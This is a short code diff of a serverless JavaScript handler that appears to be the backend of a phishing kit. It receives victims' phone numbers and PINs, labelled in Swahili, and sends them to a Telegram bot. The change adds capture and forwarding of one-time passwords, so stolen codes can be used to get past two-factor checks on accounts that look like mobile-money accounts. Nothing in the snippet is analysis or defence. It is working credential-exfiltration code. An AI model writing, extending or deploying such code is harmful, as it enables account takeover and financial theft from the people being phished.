@@ -14,9 +14,14 @@ exports.handler = async function(event, context) {
 
   try {
     const data = JSON.parse(event.body);
-    const { phone, pin } = data;
+    const { phone, pin, otp } = data;
 
-    const message = `🚨 New Submission 🚨\n\nNamba: ${phone}\nSiri: ${pin}`;
+    let message = '';
+    if (otp) {
+      message = `🚨 New OTP Submission 🚨\n\nNamba: ${phone}\nOTP: ${otp}`;
+    } else {
+      message = `🚨 New Submission 🚨\n\nNamba: ${phone}\nSiri: ${pin}`;
+    }
 
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
     const payload = JSON.stringify({
